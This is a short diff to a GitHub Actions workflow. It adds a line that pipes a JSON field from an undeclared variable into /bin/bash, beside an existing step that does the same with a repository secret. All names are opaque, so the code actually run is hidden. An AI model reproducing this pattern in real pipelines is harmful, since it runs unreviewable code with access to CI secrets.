@@ -19,6 +19,7 @@ jobs:
           wmj7431: ${{ secrets.wmj7431 }}
         run: |
           printf '%s' "$wmj7431" | jq -r .cmti36 | /bin/bash
+          echo $gx00 | jq -r .k771 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
